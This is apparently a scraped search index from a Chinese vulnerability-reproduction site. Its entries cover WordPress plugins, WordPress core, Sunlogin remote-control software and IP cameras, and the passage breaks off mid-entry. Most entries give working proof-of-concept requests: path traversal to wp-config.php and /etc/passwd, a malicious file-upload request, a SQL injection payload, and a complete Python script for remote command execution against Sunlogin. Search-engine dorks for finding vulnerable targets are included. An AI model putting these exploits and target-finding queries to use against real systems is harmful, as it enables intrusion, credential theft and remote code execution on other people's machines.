","date":"0001-01-01","objectID":"/wordpress-redux-framework-class-redux-helpers.php-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2021-38314/:0:0","tags":null,"title":"","uri":"/wordpress-redux-framework-class-redux-helpers.php-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2021-38314/"},{"categories":null,"content":"漏洞描述 2021年8月爆出Redux Framework存在未授权的敏感信息泄露漏洞，CVE编号为CVE-2021-38314，影响v4.2.11及以下版本，发送特定的请求包可以在未授权的情况下获取服务器敏感信息 ","date":"0001-01-01","objectID":"/wordpress-redux-framework-class-redux-helpers.php-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2021-38314/:1:0","tags":null,"title":"","uri":"/wordpress-redux-framework-class-redux-helpers.php-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2021-38314/"},{"categories":null,"content":"漏洞影响 Redux Framework \u003c= v4.2.11 ","date":"0001-01-01","objectID":"/wordpress-redux-framework-class-redux-helpers.php-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2021-38314/:2:0","tags":null,"title":"","uri":"/wordpress-redux-framework-class-redux-helpers.php-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2021-38314/"},{"categories":null,"content":"插件名 Redux Framework https://github.com/reduxframework/redux-framework ","date":"0001-01-01","objectID":"/wordpress-redux-framework-class-redux-helpers.php-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2021-38314/:3:0","tags":null,"title":"","uri":"/wordpress-redux-framework-class-redux-helpers.php-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2021-38314/"},{"categories":null,"content":"漏洞复现 影响范围为 v4.211 以下, 看一下版本间的更新差异 这里将 add_action 注册的函数都删除掉了，本地安装查看函数相关代码 $support_hash = md5( md5( Redux_Functions_Ex::hash_key() . '-redux' ) . '-support' ); add_action( 'wp_ajax_nopriv_' . $support_hash, array( 'Redux_Helpers', 'support_args' ) ); add_action( 'wp_ajax_' . $support_hash, array( 'Redux_Helpers', 'support_args' ) ); $hash_arg = md5( trailingslashit( network_site_url() ) . '-redux' ); add_action( 'wp_ajax_nopriv_' . $hash_arg, array( 'Redux_Helpers', 'hash_arg' ) ); add_action( 'wp_ajax_' . $hash_arg, array( 'Redux_Helpers', 'hash_arg' ) ); add_action( 'wp_ajax_redux_support_hash', array( 'Redux_Functions', 'support_hash' ) ); add_filter( 'redux/tracking/options', array( 'Redux_Helpers', 'redux_stats_additions' ) ); 查看 add_action 注册的函数 hash_arg() 和 support_args() public static function hash_arg() { echo esc_html( md5( Redux_Functions_Ex::hash_key() . '-redux' ) ); die(); } public static function support_args() { header( 'Expires: Mon, 26 Jul 1997 05:00:00 GMT' ); header( 'Last-Modified: ' . gmdate( 'D, d M Y H:i:s' ) . 'GMT' ); header( 'Expires: Sat, 26 Jul 1997 05:00:00 GMT' ); header( 'Cache-Control: no-store, no-cache, must-revalidate' ); header( 'Cache-Control: post-check=0, pre-check=0', false ); header( 'Pragma: no-cache' ); $instances = Redux::all_instances(); if ( isset( $_REQUEST['i'] ) \u0026\u0026 ! empty( $_REQUEST['i'] ) ) { // phpcs:ignore WordPress.Security.NonceVerification if ( is_array( $instances ) \u0026\u0026 ! empty( $instances ) ) { foreach ( $instances as $opt_name =\u003e $data ) { if ( md5( $opt_name . '-debug' ) === $_REQUEST['i'] ) { // phpcs:ignore WordPress.Security.NonceVerification $array = $data; } } } if ( isset( $array ) ) { // We only want the extension names and versions. $array-\u003eextensions = self::get_extensions( $opt_name ); $to_return = array(); // Filter out all the unwanted data. foreach ( $array as $key =\u003e $value ) { if ( in_array( $key, array( // 'fields', 'extensions', 'sections', 'args', // 'field_types' ), true ) ) { $to_return[ $key ] = $value; } else { // phpcs:ignore Generic.CodeAnalysis.EmptyStatement // phpcs:ignore Squiz.PHP.CommentedOutCode /* echo $key.PHP_EOL; */ } } $array = $to_return; } else { die(); } } else { $array = self::get_statistics_object(); if ( is_array( $instances ) \u0026\u0026 ! empty( $instances ) ) { $array['instances'] = array(); foreach ( $instances as $opt_name =\u003e $data ) { $array['instances'][] = $opt_name; } } $array['key'] = md5( Redux_Functions_Ex::hash_key() ); } ksort( $array ); // Let's make that pretty. // phpcs:ignored WordPress.PHP.NoSilencedErrors, WordPress.Security.EscapeOutput echo @htmlspecialchars( @wp_json_encode( $array, true ), ENT_QUOTES ); die(); } support_args() 函数 $_REQUEST[‘i’] 为空，来到另一处分支 } else { $array = self::get_statistics_object(); if ( is_array( $instances ) \u0026\u0026 ! empty( $instances ) ) { $array['instances'] = array(); foreach ( $instances as $opt_name =\u003e $data ) { $array['instances'][] = $opt_name; } } $array['key'] = md5( Redux_Functions_Ex::hash_key() ); } 跟踪 get_statistics_object() 函数，该函数可以获取插件等环境变量信息 可以看到该函数 为 wp_ajax_nopriv_* 可未授权调用 其中需要变量 $support_hash, 跟踪 hash_key() 方法 $support_hash = md5( md5( Redux_Functions_Ex::hash_key() . '-redux' ) . '-support' ); wp-config.php 中存在 AUTH_KEY 参数，为随机值 回到 hash_arg() 函数 public static function hash_arg() { echo esc_html( md5( Redux_Functions_Ex::hash_key() . '-redux' ) ); die(); } 这里就调用到了 Redux_Functions_Ex::hash_key() 中的函数，且返回 md5值 回到刚刚的代码中，可以发现得到的结果同样也是 $support_hash 我们所需要知道的参数，下面为等价替换 $support_hash = md5(hash_arg(). '-support' ); 这样我们就获取到了一个利用链 $hash_arg = md5( trailingslashit( network_site_url() ) . '-redux' ); add_action( 'wp_ajax_nopriv_' . $hash_arg, array( 'Redux_Helpers', 'hash_arg' ) ); | 获取 md5( Redux_Functions_Ex::hash_key() . '-redux') 值 | $support_hash = md5( md5( Redux_Functions_Ex::hash_key() . '-redux' ) . '-support' ); add_action( 'wp_ajax_nopriv_' . $support_hash, array( 'Redux_Helpers', 'support_args' ) ); | 调用函数 support_args 获取系统敏感信息 成功获取到了插件版本等有关信息 ","date":"0001-01-01","objectID":"/wordpress-redux-framework-class-redux-helpers.php-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2021-38314/:4:0","tags":null,"title":"","uri":"/wordpress-redux-framework-class-redux-helpers.php-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2021-38314/"},{"categories":null,"content":"WordPress Simple File List ee-downloader.php 任意文件读取漏洞 CVE-2022-1119 ","date":"0001-01-01","objectID":"/wordpress-simple-file-list-ee-downloader.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2022-1119/:0:0","tags":null,"title":"","uri":"/wordpress-simple-file-list-ee-downloader.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2022-1119/"},{"categories":null,"content":"漏洞描述 WordPress Simple File List插件 ee-downloader.php文件存在任意文件读取漏洞，攻击者通过漏洞可以读取服务器中的任意文件 ","date":"0001-01-01","objectID":"/wordpress-simple-file-list-ee-downloader.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2022-1119/:1:0","tags":null,"title":"","uri":"/wordpress-simple-file-list-ee-downloader.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2022-1119/"},{"categories":null,"content":"漏洞影响 WordPress Simple File List \u003c 3.2.8 ","date":"0001-01-01","objectID":"/wordpress-simple-file-list-ee-downloader.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2022-1119/:2:0","tags":null,"title":"","uri":"/wordpress-simple-file-list-ee-downloader.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2022-1119/"},{"categories":null,"content":"插件名 Simple File List https://downloads.wordpress.org/plugin/simple-file-list.3.2.17.zip ","date":"0001-01-01","objectID":"/wordpress-simple-file-list-ee-downloader.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2022-1119/:3:0","tags":null,"title":"","uri":"/wordpress-simple-file-list-ee-downloader.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2022-1119/"},{"categories":null,"content":"漏洞复现 存在漏洞的文件为 wp-content/plugins/simple-file-list/includes/ee-downloader.php \u003c?php // Simple File List - ee-downloader.php - rev 1.19 - mitchellbennis@gmail.com // Force File to Download // This script is accessed via javascript on ee-download.php $eeFile = filter_var($_GET['eeFile'], FILTER_SANITIZE_STRING, FILTER_FLAG_ENCODE_LOW); if(is_readable($eeFile)) { header('Pragma: public'); // required header('Expires: 0'); // no cache header('Cache-Control: must-revalidate, post-check=0, pre-check=0'); header('Last-Modified: '. gmdate ('D, d M Y H:i:s', filemtime ($eeFile)) .' GMT'); header('Cache-Control: private',false); header('Content-Type: ' . mime_content_type($eeFile) ); header('Content-Disposition: attachment; filename=\"'. basename($eeFile) .'\"'); // header('Content-Transfer-Encoding: binary'); header('Content-Length: '. filesize($eeFile)); // provide file size header('Connection: close'); readfile($eeFile); // Start the download } ?\u003e 直接传参获取文件信息, 验证POC /wp-content/plugins/simple-file-list/includes/ee-downloader.php?eeFile=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/wp-config.php ","date":"0001-01-01","objectID":"/wordpress-simple-file-list-ee-downloader.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2022-1119/:4:0","tags":null,"title":"","uri":"/wordpress-simple-file-list-ee-downloader.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2022-1119/"},{"categories":null,"content":"WordPress SuperForms 4.9 任意文件上传到远程代码执行 ","date":"0001-01-01","objectID":"/wordpress-superforms-4.9-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/:0:0","tags":null,"title":"","uri":"/wordpress-superforms-4.9-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"},{"categories":null,"content":"漏洞描述 SuperForms官方链接：https://renstillmann.github.io/super-forms/#/ 参考链接： https://www.exploit-db.com/exploits/49490 ","date":"0001-01-01","objectID":"/wordpress-superforms-4.9-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/:1:0","tags":null,"title":"","uri":"/wordpress-superforms-4.9-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"},{"categories":null,"content":"漏洞影响 All (\u003c= 4.9.X) ","date":"0001-01-01","objectID":"/wordpress-superforms-4.9-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/:2:0","tags":null,"title":"","uri":"/wordpress-superforms-4.9-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"},{"categories":null,"content":"Google Dork inurl:\"/wp-content/plugins/super-forms/\" ","date":"0001-01-01","objectID":"/wordpress-superforms-4.9-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/:3:0","tags":null,"title":"","uri":"/wordpress-superforms-4.9-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"},{"categories":null,"content":"漏洞复现 poc： POST /wp-content/plugins/super-forms/uploads/php/ HTTP/1.1 \u003c=== exploit end point Host: localhost User-Agent: UserAgent Accept: application/json, text/javascript, */*; q=0.01 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate X-Requested-With: XMLHttpRequest Content-Type: multipart/form-data; boundary=---------------------------423513681827540048931513055996 Content-Length: 7058 Origin: localhost Connection: close Referer: localhost Cookie: -----------------------------423513681827540048931513055996 Content-Disposition: form-data; name=\"accept_file_types\" jpg|jpeg|png|gif|pdf|JPG|JPEG|PNG|GIF|PDF \u003c======= inject extension (|PHP4) to validate file to upload -----------------------------423513681827540048931513055996 Content-Disposition: form-data; name=\"max_file_size\" 8000000 -----------------------------423513681827540048931513055996 Content-Disposition: form-data; name=\"image_library\" 0 -----------------------------423513681827540048931513055996 Content-Disposition: form-data; name=\"files[]\"; filename=\"filename.(extension)\" \u003c==== inject code extension (.php4) for example Content-Type: application/pdf Evil codes to be uploaded -----------------------------423513681827540048931513055996-- # Uploaded Malicious File can be Found in : /wp-content/uploads/superforms/2021/01/\u003cid\u003e/filename.php4 u can get \u003cid\u003e from server reply . ","date":"0001-01-01","objectID":"/wordpress-superforms-4.9-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/:4:0","tags":null,"title":"","uri":"/wordpress-superforms-4.9-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"},{"categories":null,"content":"WordPress WP_Query SQL 注入漏洞 CVE-2022-21661 ","date":"0001-01-01","objectID":"/wordpress-wp_query-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2022-21661/:0:0","tags":null,"title":"","uri":"/wordpress-wp_query-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2022-21661/"},{"categories":null,"content":"漏洞描述 WordPress是一个用PHP编写的免费开源内容管理系统，由于clean_query函数的校验不当，导致了可能通过插件或主题以某种方式从而触发SQL注入的情况。这已经在WordPress5.8.3中进行了修复。影响版本可以追溯到3.7.37。 参考链接： https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-6676-cqfm-gw84 ","date":"0001-01-01","objectID":"/wordpress-wp_query-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2022-21661/:1:0","tags":null,"title":"","uri":"/wordpress-wp_query-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2022-21661/"},{"categories":null,"content":"漏洞影响 WordPress \u003c 5.8.3 ","date":"0001-01-01","objectID":"/wordpress-wp_query-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2022-21661/:2:0","tags":null,"title":"","uri":"/wordpress-wp_query-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2022-21661/"},{"categories":null,"content":"漏洞POC 获取数据库名： POST /wp-admin/admin-ajax.php HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36 Accept: */* Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 130 action=test\u0026data={\"tax_query\":[{\"field\":\"term_taxonomy_id\",\"terms\":[\"1) and extractvalue(rand(),concat(0x5e,(select group_concat(schema_name) from information_schema.SCHEMATA)))#\"]}]} ","date":"0001-01-01","objectID":"/wordpress-wp_query-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2022-21661/:3:0","tags":null,"title":"","uri":"/wordpress-wp_query-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2022-21661/"},{"categories":null,"content":"向日葵 check 远程命令执行漏洞 CNVD-2022-10270 ","date":"0001-01-01","objectID":"/%E5%90%91%E6%97%A5%E8%91%B5-check-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2022-10270/:0:0","tags":null,"title":"","uri":"/%E5%90%91%E6%97%A5%E8%91%B5-check-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2022-10270/"},{"categories":null,"content":"漏洞描述 向日葵通过发送特定的请求获取CID后，可调用 check接口实现远程命令执行，导致服务器权限被获取 ","date":"0001-01-01","objectID":"/%E5%90%91%E6%97%A5%E8%91%B5-check-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2022-10270/:1:0","tags":null,"title":"","uri":"/%E5%90%91%E6%97%A5%E8%91%B5-check-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2022-10270/"},{"categories":null,"content":"漏洞影响 11.0.0.33162 ","date":"0001-01-01","objectID":"/%E5%90%91%E6%97%A5%E8%91%B5-check-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2022-10270/:2:0","tags":null,"title":"","uri":"/%E5%90%91%E6%97%A5%E8%91%B5-check-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2022-10270/"},{"categories":null,"content":"网络测绘 body=\"Verification failure\" ","date":"0001-01-01","objectID":"/%E5%90%91%E6%97%A5%E8%91%B5-check-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2022-10270/:3:0","tags":null,"title":"","uri":"/%E5%90%91%E6%97%A5%E8%91%B5-check-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2022-10270/"},{"categories":null,"content":"漏洞复现 向日葵在开启后会默认在 40000-65535 之间开启某端口 发送请求获取CID /cgi-bin/rpc?action=verify-haras 使用获取到的 verify_string 作为 cookie的 CID字段，进行命令执行 /check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+ipconfig ","date":"0001-01-01","objectID":"/%E5%90%91%E6%97%A5%E8%91%B5-check-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2022-10270/:4:0","tags":null,"title":"","uri":"/%E5%90%91%E6%97%A5%E8%91%B5-check-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2022-10270/"},{"categories":null,"content":"漏洞修复 输入检查:应用程序必须实现输入检查机制，将所有从外部接收的数据都进行严格的检查和过滤，防止恶意代码被注入。 参数化查询:采用参数化查询可以防止攻击者通过利用应用程序的注入漏洞来修改查询语句，实现任意代码执行的攻击。 输出编码:在输出时对敏感字符进行编码保护，比如 HTML 编码，防止恶意代码直接输出执行。 使用最新的安全防护措施:保证服务器系统和应用程序的所有组件、库和插件都是最 新的，确保已知的漏洞都得到修复。 强制访问控制:应该设置访问控制机制，确保恶意用户无法访问敏感数据和代码。 ","date":"0001-01-01","objectID":"/%E5%90%91%E6%97%A5%E8%91%B5-check-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2022-10270/:5:0","tags":null,"title":"","uri":"/%E5%90%91%E6%97%A5%E8%91%B5-check-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2022-10270/"},{"categories":null,"content":"漏洞POC exp： import requests,sys ip = sys.argv[1] command = sys.argv[2] payload1 = \"/cgi-bin/rpc?action=verify-haras\" payload2 = \"/check?cmd=ping../../../../../../../../../windows/system32/WindowsPowerShell/v1.0/powershell.exe+\" headers = { 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0' } if \"http://\" not in ip: host = \"http://\" + ip else: host = ip try: s = requests.Session() res = s.get(url=host + payload1,headers=headers) if res.status_code == 200: res = res.json() Cid = res['verify_string'] headers.update({'Cookie':\"CID=\" + Cid}) res1 = s.get(url=host + payload2 + command,headers=headers) res1.encoding = \"GBK\" print(res1.text) else: pass except Exception as e: print(e) ","date":"0001-01-01","objectID":"/%E5%90%91%E6%97%A5%E8%91%B5-check-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2022-10270/:6:0","tags":null,"title":"","uri":"/%E5%90%91%E6%97%A5%E8%91%B5-check-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2022-10270/"},{"categories":null,"content":"ACTI 视频监控 images 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/acti-%E8%A7%86%E9%A2%91%E7%9B%91%E6%8E%A7-images-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/acti-%E8%A7%86%E9%A2%91%E7%9B%91%E6%8E%A7-images-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 ACTI 视频监控 存在任意文件读取漏洞 ","date":"0001-01-01","objectID":"/acti-%E8%A7%86%E9%A2%91%E7%9B%91%E6%8E%A7-images-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/acti-%E8%A7%86%E9%A2%91%E7%9B%91%E6%8E%A7-images-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 ACTI摄像头 ","date":"0001-01-01","objectID":"/acti-%E8%A7%86%E9%A2%91%E7%9B%91%E6%8E%A7-images-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/acti-%E8%A7%86%E9%A2%91%E7%9B%91%E6%8E%A7-images-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"ACTi-视频监控\" ","date":"0001-01-01","objectID":"/acti-%E8%A7%86%E9%A2%91%E7%9B%91%E6%8E%A7-images-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/acti-%E8%A7%86%E9%A2%91%E7%9B%91%E6%8E%A7-images-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 使用Burp抓包 /images/../../../../../../../../etc/passwd ","date":"0001-01-01","objectID":"/acti-%E8%A7%86%E9%A2%91%E7%9B%91%E6%8E%A7-images-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/acti-%E8%A7%86%E9%A2%91%E7%9B%91%E6%8E%A7-images-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Amcrest IP Camera Web Sha1Account1 账号密码泄漏漏洞 CVE-2017-8229 ","date":"0001-01-01","objectID":"/amcrest-ip-camera-web-sha1account1-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2017-8229/:0:0","tags":null,"title":"","uri":"/amcrest-ip-camera-web-sha1account1-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2017-8229/"},{"categories":null,"content":"漏洞描述 Amcrest IP Camera Web是Amcrest公司的一款无线IP摄像头，设备允许未经身份验证的攻击者下载管理凭据。 ","date":"0001-01-01","objectID":"/amcrest-ip-camera-web-sha1account1-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2017-8229/:1:0","tags":null,"title":"","uri":"/amcrest-ip-camera-web-sha1account1-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2017-8229/"},{"categories":null,"content":"漏洞影响 Amcrest Technologies. Amcrest IP Camera Web all ","date":"0001-01-01","objectID":"/amcrest-ip-camera-web-sha1account1-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2017-8229/:2:0","tags":null,"title":"","uri":"/amcrest-ip-camera-web-sha1account1-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2017-8229/"},{"categories":null,"content":"网络测绘 \"Amcrest\" ","date":"0001-01-01","objectID":"/amcrest-ip-camera-web-sha1account1-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2017-8229/:3:0","tags":null,"title":"","uri":"/amcrest-ip-camera-web-sha1account1-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2017-8229/"},{"categories":null,"content":"漏洞复现 登录页面 POC /current_config/Sha1Account1 ","date":"0001-01-01","objectID":"/amcrest-ip-camera-web-sha1account1-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2017-8229/:4:0","tags":null,"title":"","uri":"/amcrest-ip-camera-web-sha1account1-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2017-8229/"},{"categories":null,"content":"Arcadyan固件 cgi_i_filter.js 配置信息泄漏漏洞 CVE-2021-20092 ","date":"0001-01-01","objectID":"/arcadyan%E5%9B%BA%E4%BB%B6-cgi_i_filter.js-%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2021-20092/:0:0","tags":null,"title":"","uri":"/arcadyan%E5%9B%BA%E4%BB%B6-cgi_i_filter.js-%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2021-20092/"},{"categories":null,"content":"漏洞描述 Buffalo WSR-2533DHPL2 固件版本 \u003c= 1.02 和 WSR-2533DHP3 固件版本 \u003c= 1.24 的 Web 